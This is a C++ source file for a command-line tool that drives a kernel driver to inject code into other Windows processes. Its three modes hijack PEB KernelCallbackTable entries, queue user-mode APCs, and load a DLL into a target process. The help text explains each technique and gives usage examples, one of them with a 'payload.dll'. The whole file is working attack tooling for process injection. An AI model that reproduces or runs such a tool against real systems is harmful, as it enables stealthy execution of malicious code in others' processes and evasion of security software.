#include <print>
#include <memory>
#include <string>
#include <string_view>
#include "../Memory/DriverInterface/driver_interface.hpp"

static void print_help( std::string_view prog )
{
	std::print( R"({0} - Kernel-assisted code injection via driver.

Description:
  Demonstrates kernel-mode code injection techniques: hijacking the
  PEB KernelCallbackTable, queuing user-mode APCs, and injecting DLLs.

Usage:
  {0} callback-table <pid> <index> <addr>   Hijack callback table entry
  {0} apc <pid> <tid> <routine> <argument>  Queue a user-mode APC
  {0} dll <pid> <dll_path>                   Inject a DLL into a process
  {0} --help                                 Show this help

Arguments:
  pid         Target process ID
  index       KernelCallbackTable array index (0-255)
  addr        User-mode address (hex, e.g. 0x7FFE1234)
  tid         Target thread ID
  routine     User-mode APC routine address (hex)
  argument    APC argument value (hex)
  dll_path    Full path to the DLL to inject

Details:
  Callback table hijack overwrites an entry in PEB.KernelCallbackTable
  (offset 0x58). When win32k.sys invokes that callback index, control
  transfers to the specified address in user mode.

  APC injection queues a user-mode APC via KeInitializeApc +
  KeInsertQueueApc. The APC fires when the target thread enters an
  alertable wait (WaitForSingleObjectEx, SleepEx, etc.).

  DLL injection allocates memory in the target, writes the DLL path,
  and triggers LdrLoadDll via an APC.

Examples:
  {0} callback-table 1234 5 0x7FFE0000
  {0} apc 1234 5678 0x7FFE0000 0x0
  {0} dll 1234 C:\Users\user\payload.dll
)", prog );
}

static ULONG64 parse_hex_or_dec( const char* s )
{
	const auto sv = std::string_view{ s };
	if( sv.starts_with( "0x" ) || sv.starts_with( "0X" ) )
		return std::stoull( std::string{ sv }, nullptr, 16 );
	return std::stoull( s );
}

static std::wstring to_wide( std::string_view s )
{
	return std::wstring( s.begin(), s.end() );
}

int main( int argc, char* argv[] )
{
	if( argc < 2 || std::string_view{ argv[1] } == "--help" || std::string_view{ argv[1] } == "-h" )
	{
		print_help( argv[0] );
		return ( argc > 1 ) ? 0 : 1;
	}

	const auto driver = std::make_unique< driver_interface >();

	if( !driver->is_connected() )
	{
		std::println( "[!] Could not connect to the driver!" );
		return 1;
	}

	const auto cmd = std::string_view{ argv[1] };

	if( cmd == "callback-table" )
	{
		if( argc < 5 )
		{
			std::println( "[!] Usage: {} callback-table <pid> <index> <addr>", argv[0] );
			return 1;
		}

		const auto pid   = static_cast< DWORD >( std::stoul( argv[2] ) );
		const auto index = static_cast< ULONG >( std::stoul( argv[3] ) );
		const auto addr  = parse_hex_or_dec( argv[4] );

		if( auto prev = driver->hijack_callback_table( pid, index, addr ) )
		{
			std::println( "[+] Hijacked callback table[{}] in PID {}.", index, pid );
			std::println( "    Previous: 0x{:X} -> New: 0x{:X}", *prev, addr );
		}
		else
		{
			std::println( "[!] Failed to hijack callback table." );
			return 1;
		}
	}
	else if( cmd == "apc" )
	{
		if( argc < 6 )
		{
			std::println( "[!] Usage: {} apc <pid> <tid> <routine> <argument>", argv[0] );
			return 1;
		}

		const auto pid      = static_cast< DWORD >( std::stoul( argv[2] ) );
		const auto tid      = parse_hex_or_dec( argv[3] );
		const auto routine  = parse_hex_or_dec( argv[4] );
		const auto argument = parse_hex_or_dec( argv[5] );

		if( driver->queue_kernel_apc( pid, tid, routine, argument ) )
			std::println( "[+] Queued APC to thread {} in PID {}. Routine: 0x{:X}.", tid, pid, routine );
		else
		{
			std::println( "[!] Failed to queue kernel APC." );
			return 1;
		}
	}
	else if( cmd == "dll" )
	{
		if( argc < 4 )
		{
			std::println( "[!] Usage: {} dll <pid> <dll_path>", argv[0] );
			return 1;
		}

		const auto pid  = static_cast< DWORD >( std::stoul( argv[2] ) );
		const auto path = to_wide( argv[3] );

		if( auto addr = driver->inject_dll( pid, path ) )
			std::println( "[+] Injected DLL into PID {}. Allocated at: 0x{:X}.", pid, *addr );
		else
		{
			std::println( "[!] Failed to inject DLL." );
			return 1;
		}
	}
	else
	{
		std::println( "[!] Unknown command '{}'. Use --help for usage.", cmd );
		return 1;
	}

	return 0;
}
